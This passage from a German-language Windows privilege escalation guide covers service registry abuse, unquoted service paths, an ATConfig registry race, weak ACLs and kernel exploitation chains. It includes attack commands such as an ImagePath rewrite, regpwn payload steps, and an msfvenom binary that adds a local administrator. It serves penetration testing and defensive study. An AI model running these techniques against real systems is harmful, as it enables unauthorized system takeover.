. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst einem normalen Benutzer keinen Neustart erlaubt, prüfe, ob er beim Systemstart automatisch gestartet wird, eine Fehleraktion hat, die ihn erneut startet, oder indirekt von der Anwendung ausgelöst werden kann, die ihn verwendet.

### Änderungsberechtigungen für Dienst-Registry-Einträge

Du solltest prüfen, ob du eine Dienst-Registry ändern kannst.\
Du kannst deine **Berechtigungen** für einen Dienst-**Registry-Eintrag** wie folgt **prüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Prüfen Sie, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über Schreibrechte auf einem bestimmten Serviceschlüssel verfügen. Ein ACL-Eintrag allein beweist keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen sind ebenfalls relevant. Die Rechte für Registrierungsschlüssel sind unabhängig von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` des Serviceobjekts. Für eine Privilegieneskalation sind außerdem ein verwendbares Konfigurationsfeld des Service, eine Möglichkeit, den Service auszulösen, und eine höher privilegierte Serviceidentität erforderlich. Siehe Microsofts [Rechte für Registrierungsschlüssel](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [Referenz zu Servicezugriffsrechten](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So ändern Sie den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebige HKLM-Wertschreibvorgänge (ATConfig)

Einige Windows-Barrierefreiheitsfeatures erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine Registry-**Symbolic-Link-Race** kann diesen privilegierten Schreibvorgang in einen **beliebigen HKLM-Pfad** umleiten und so eine Primitive zum **Schreiben beliebiger HKLM-Werte** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfeatures auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während der Anmeldung bzw. beim Wechsel zum sicheren Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Missbrauchs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert an, der von SYSTEM geschrieben werden soll.
2. Löse das Kopieren auf den sicheren Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne das Race**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt; wenn das oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du durch Überschreiben von Dienstkonfigurationswerten zu LPE wechseln:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und löse ihn nach dem Schreibvorgang aus. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt im Rahmen des Race die Workstation**.

Beispieltools (RegPwn BOF / Standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Wenn Sie diese Berechtigung für einen Registry-Schlüssel haben, bedeutet das, dass Sie **darunter Unterschlüssel erstellen können**. Bei Windows-Diensten reicht das aus, um **beliebigen Code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jeden Pfad bis zu einem Leerzeichen auszuführen.

Zum Beispiel versucht Windows bei diesem Pfad _C:\Program Files\Some Folder\Service.exe_, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle nicht in Anführungszeichen gesetzten Dienstpfade auf, ausgenommen die zu integrierten Windows-Diensten gehörenden Pfade:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Du kannst diese Sicherheitslücke mit metasploit erkennen und ausnutzen:** `exploit/windows/local/trusted\_service\_path` Du kannst mit metasploit manuell eine Dienst-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht Benutzern, Aktionen festzulegen, die ausgeführt werden sollen, wenn ein Dienst ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Ist diese Binärdatei ersetzbar, könnte privilege escalation möglich sein. Weitere Informationen finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skriptziele geplanter Aufgaben

Bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, prüfen Sie sowohl das in den **Aktionsargumenten** genannte Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, beispielsweise PowerShell `-File`. Enthält eine geplante Batchdatei einen direkten PowerShell-Aufruf mit `-File`, prüfen Sie auch die ACL des referenzierten Skripts; Variablen, Bedingungen und die Verkettung von Shell-Befehlen müssen manuell nachverfolgt werden. Ein Skript oder übergeordnetes Verzeichnis, in das der aufrufende Benutzer schreiben kann, ist nur dann ein Ansatzpunkt für eine kontoübergreifende Ausführung, wenn sich der konfigurierte Sicherheitsprinzipal der Aufgabe vom aufrufenden Benutzer unterscheidet und die Aufgabe diese Aktion tatsächlich erreicht. Eine ACL, die nur das Anhängen erlaubt, kann bei Skripten relevant sein, aber ein vorangehendes `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen unerreichbar machen. Prüfen Sie die effektiven ACLs, den [Aufgabenausführungskontext](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Anwendungssteuerungsrichtlinie, bevor Sie von privilege escalation sprechen. Die Inventarisierung sollte weder das Skript ändern noch die Aufgabe starten.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor Sie Inhalte öffnen; Windows stellt sie über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShells [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Ansatzpunkt. Prüfen Sie die effektiven Leseberechtigungen für die Datei, die Unterstützung von Streams durch das Dateisystem, ob der Stream verwendbare Zugangsdaten enthält und für welches Konto diese tatsächlich gültig sind. Vermeiden Sie bei der routinemäßigen Aufzählung rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Eingaben für geplante Windows Driver Kit-Hilfsprogramme

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das im Ausführungsverzeichnis die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` verarbeiten kann. Eine geplante Aufgabe oder ein Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff mit geringen Berechtigungen auf diese Eingabedateien in Befehlsausführung im Kontext dieses Kontos umwandeln, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Prüfen Sie, ob ein privilegierter Prozess die Dateien verwendet und ob **beide** Begleitdateien erstellt oder geändert werden können; allein das Auffinden des Hilfsprogramms reicht nicht aus.

Prüfen Sie bei einer geplanten Aufgabe deren Aktionseigenschaft [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) sowie die ACLs der beiden Pfade zu den Begleitdateien. Gibt die Aufgabe kein Arbeitsverzeichnis an, ist das Verzeichnis der ausführbaren Datei lediglich ein zu überprüfender Ansatzpunkt und kein Beleg dafür, wo die Aufgabe ihre Eingaben liest. Auch die Voraussetzung der Projekt-Arbeitsdatei muss erfüllt sein. Prüfen Sie den tatsächlichen Sicherheitsprinzipal der Aufgabe, statt anzunehmen, dass sie als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (möglicherweise können Sie eine davon überschreiben und privilege escalation erreichen) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Reparaturpfad des Checkmk-Windows-Agenten

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agenten, die Befehlsdateien in `C:\Windows\Temp` schrieben und dann eine bereits vorhandene schreibgeschützte Datei ausführten, wenn das Ersetzen fehlschlug. Der Anbieter hat das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1 behoben. Prüfen Sie den vollständigen installierten Patch-Level und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine reine Branch-Angabe wie `2.1` belegt keine Anfälligkeit. Bei der Enumeration können Version, Dienststatus und Temp-Berechtigungen geprüft werden, ohne Dateien anzulegen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus bis einschließlich Build 6210; der Anbieter hat das Problem in Build 6211 behoben. Es ist nur relevant, wenn SAML SSO aktiviert ist oder war. Ein Eintrag für ein installiertes Produkt oder ein Dienstpfad ist daher ein Hinweis, kein Beleg für eine Sicherheitslücke: Bestätigen Sie den genauen Build, den Verlauf der SAML-Konfiguration, die Netzwerk-Erreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Die Codeausführung über den Dienst erbt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM setzt eine als SYSTEM laufende Instanz voraus. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, kein Beleg für verwendbare Zugangsdaten oder diese SAML-Schwachstelle. Notieren Sie bei der routinemäßigen Enumeration den Pfad und die Zugriffsrechte, ohne die Datei zu entpacken.

#### Grenzen bei Jenkins-Controllern und Domänenkonten

Unterscheiden Sie auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job anzulegen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins führt diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build` auf](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Weg zum Build bieten, aber bestätigen Sie, dass er aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agents; gespeicherte Zugangsdaten können nur verwendet werden, wenn der Job auf deren Geltungsbereich zugreifen kann. Prüfen Sie außerdem separat den Zugriff auf die Metadaten von `JENKINS_HOME`: Jenkins speichert Zugangsdaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Geheimnisspeicherung](https://www.jenkins.io/doc/developer/security/secrets/)). Ihr bloßes Vorhandensein legt kein Passwort offen; prüfen Sie den **Lesezugriff auf die erforderlichen Dateien** und einen separaten Pfad zur Wiederverwendung des Kontos, ohne Geheimnisse in gemeinsam genutzten Ausgaben offenzulegen. Wenn dieses Konto über ein Schreibrecht für `scriptPath` des AD-Benutzerobjekts verfügt, bestätigen Sie einen beschreibbaren Skriptpfad und einen tatsächlichen Anmelde- oder geplanten Prozess, der als Zielbenutzer ausgeführt wird, bevor Sie dies als kontoübergreifende Ausführung einstufen. Weitergehende Gruppensteuerung erfordert eine separate Überprüfung der effektiven AD-Rechte.

#### Identität eines selbst gehosteten Azure-Pipelines-Agents

Unterscheiden Sie bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, und der Berechtigung, sie **in die Warteschlange zu stellen** und den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) separat. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt einreichen und diese Pipeline auf einem selbst gehosteten Windows-Agent ausführen kann, wird der Schritt als [konfiguriertes Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Überprüfen Sie die genaue Pipeline, Branch- und Ressourcenbeschränkungen, den autorisierten Pool, einen ausführbaren Job und die Dienstidentität des Agents, bevor Sie einen kontoübergreifenden oder SYSTEM-Übergang behaupten. Ein installierter Agent, eine Projektrolle oder Schreibzugriff auf ein Repository sind für sich genommen nur Hinweise; prüfen Sie Berechtigungen und lokale Dienstmetadaten, ohne während einer passiven Enumeration einen Build zu starten.

#### Anmeldeinformationen von Microsoft Entra Connect Sync

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, das den Synchronisierungsdienst ausführt und auf die SQL-Datenbank zugreift, und dem **AD-DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Die Anmeldeinformationen des Connectors werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe, deren Name auf lokale Administratorrechte hindeutet, oder bloße Datenbanksichtbarkeit belegen weder entschlüsselbare Anmeldeinformationen noch eine Domäneneskalation. Prüfen Sie separat die tatsächlichen Datenbank-Leserechte, den Zugriff auf Dienstkonto und Schlüssel, Installations- und SQL-Layout, die konfigurierte Connector-Identität und deren effektive AD-Berechtigungen. Bei der routinemäßigen Enumeration sollten nur Dienst- und Zugriffsmetadaten angezeigt werden, nicht die gespeicherten Geheimnisse abgefragt oder ausgegeben werden.

#### Berechtigungen für Druckertreiber-Support-DLLs

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` speichern und sie in einem privilegierteren Druckprozess laden. Überprüfen Sie die ACLs des genauen Treiberverzeichnisses und der DLLs, einschließlich übergeordneter Verzeichnisse und Reparse Points, selbst wenn die WMI-Aufzählung von Druckern verweigert wird. Beim [Druckertreiberproblem Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der gemeldete Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Offenlegung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Hinweis: Prüfen Sie den effektiven Schreibzugriff unter Berücksichtigung verweigernder Einträge, ob der betreffende Treiber installiert ist und die Datei unter einer privilegierten Identität lädt und ob der Anbieter die Installation mit einem aktualisierten Treiber oder Sicherheitsprogramm behoben hat. Leiten Sie eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine bestimmte Datei auszulesen, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/-Ausführung

Notepad++ lädt automatisch alle Plugin-DLLs in seinen Unterordnern `plugins`. Wenn eine beschreibbare portable/Kopie-Installation vorhanden ist, führt das Ablegen eines schädlichen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (auch über `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registry-Schlüssel oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autorun-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **ungewöhnlichen/verwundbaren Treibern von Drittanbietern**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine beliebige Kernel-Lese-/Schreibprimitive bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du deine Berechtigungen eskalieren, indem du direkt aus dem Kernel-Speicher ein SYSTEM-Token stiehlst.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Technik findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Weiteres Material zur Windows-Kernel-Exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager-Pfad öffnet, kann eine gezielte Verlangsamung des Lookups (durch Komponenten mit maximaler Länge oder tiefe Verzeichnisketten) das Zeitfenster von Mikrosekunden auf einige zehn Mikrosekunden vergrößern:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAFs in Cancel-safe Queues, Offenlegungen aus dem paged pool und I/O-ring-Pivots

Manche Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs aufbauen: einer **Lifetime-Race in einer cancel-safe queue**, bei der eine Request/CBD freigegeben wird, während die Queue-Sperre noch gehalten wird, und einer Offenlegung durch **Freigabe der Sperre vor dem Kopieren**, bei der während `RtlCopyToUser` eine freigegebene paged-pool-Allokation geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zur Analyse und Exploitation:

- **Freigabe unter Sperre + anschließender Abbruch**: Suche nach einem Erfolgspfad mit **Acquire -> CompleteRequest/free -> Release**, während der Abbruchpfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgspfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` erreicht, bevor er die CBDQ/CSQ-Sperre freigibt, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Hole das freigegebene Queue-Objekt zurück** mit einer gleich großen, vom Angreifer kontrollierten paged-pool-Allokation. `NPFS` Data Queue Entries sind nützlich, da sich Payload und Größe kontrollieren lassen und sie später mit Pipe-Read-/Peek-Operationen geprüft werden können. Wenn das freigegebene Objekt List-Links enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Knoten im Userspace**, sodass der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, statt am ursprünglichen Listen-Head zu stoppen.
- **Erweitere einen vorhersagbaren Schreibvorgang**: Wenn der gefälschte Request einen verschachtelten Context-Pointer umleitet, der für Bookkeeping-Schreibvorgänge verwendet wird (Zeitstempel / QPC / refcount-nahe Felder), erhältst du möglicherweise einen **adresskontrollierten, aber nicht wertkontrollierten** Kernel-Schreibvorgang. Ziele in diesem Fall auf das **Längen-/Größenfeld** eines gesprayten Pool-Objekts statt auf einen abschließenden Code-/Daten-Pointer und durchsuche dann den Spray, bis das beschädigte Objekt einen **Out-of-bounds-Read aus dem paged pool** ermöglicht.
- **Muster für eine Race-anfällige Offenlegung**: Jeder Syscall mit `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein aussichtsreicher Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (zum Beispiel durch Hinzufügen vieler List-/Resource-Einträge, die die endgültige Allokationsgröße eines Serializers erhöhen), da ein längerer Kopiervorgang das Ersetzungsfenster vergrößert, ohne notwendigerweise einen Systemabsturz auszulösen.
- **Pointer-reiche Ziele zum Wiederbefüllen**: Registrierte Buffer-Arrays des Windows-**I/O ring** sind hervorragende Offenlegungsziele, da ihre paged-pool-Größe vom Angreifer kontrolliert wird (`8 * regBufferCnt`) und jedes Element ein Kernel-Pointer auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays und ermittle das umgebende `IORING_OBJECT`. Beschädige dann **`RegBuffers`** und **`RegBuffersCount`**, damit nachfolgende I/O-ring-Operationen vom Angreifer gefälschte Einträge verwenden und beliebige Kernel-Lese-/Schreibzugriffe ermöglichen. Wenn der einzige verfügbare Schreibvorgang ein stabiles Byte liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Schreibvorgänge**, um einen aus wiederholten Bytes bestehenden User-Pointer wie `0x0101010101010101` zu erzeugen, bilde ihn mit `VirtualAlloc` ab und platziere das gefälschte Array registrierter Buffer dort.<sup>[[30]](#references)</sup>

Nützliche Hinweise beim Debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du über den beschädigten I/O ring beliebige Lese-/Schreibzugriffe auf den Kernel erlangt hast, stiehlst du mit dem üblichen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives zur Speicherkorruption von Registry-Hives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Layouts zu erstellen, beschreibbare HKLM-/HKU-Unterbäume auszunutzen und Metadatenkorruption ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Überläufe umzuwandeln. Die vollständige Angriffskette findest du hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type Confusion im Direct-Modus von `RtlQueryRegistryValues` durch vom Angreifer kontrollierte Pfade

Manche Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` und einem Stack-Skalar wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` entsprechend dem **tatsächlichen** Registry-Typ interpretiert, nicht dem vom Entwickler erwarteten Typ.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Oracle**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht dem Treiber, vom Angreifer ausgewählte Schlüssel abzufragen, ihre Existenz über Rückgabecodes/Logs preiszugeben und manchmal Werte auszulesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherkorruption**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder Puffer mit definierter Größe interpretiert.

Hinweise zur praktischen Ausnutzung:

- **Windows-8+-Mitigation**: Trifft die Abfrage mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK` auf ein **nicht vertrauenswürdiges Hive**, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` bereitzustellen.
- **Bereitstellung in einem vertrauenswürdigen Hive**: Verwende NtObjectManager, um beschreibbare Unterbäume von `\Registry\Machine` aufzuzählen, und führe den Scan mit einem duplizierten **Low-Integrity-Token** erneut aus, um Schlüssel zu finden, die aus Sandbox-Kontexten erreichbar sind:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibvorgang von 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im Direct-Modus muss `EntryContext` auf einen `UNICODE_STRING` zeigen. Lädt der Code zunächst ein vom Angreifer kontrolliertes `REG_DWORD` in einen skalaren Stack-Wert und verwendet dann denselben Puffer erneut für einen String-Lesevorgang, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst den `Buffer`-Zeiger teilweise. Das ermöglicht einen teilweise kontrollierten Kernel-Schreibvorgang.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der Direct-Modus den ersten `LONG` bei `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesevorgang einen vom Angreifer kontrollierten **negativen** Wert in der wiederverwendeten skalaren Variable, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Dies ist häufig der einfachste Weg, einen Callback-Zeiger vollständig zu überschreiben.

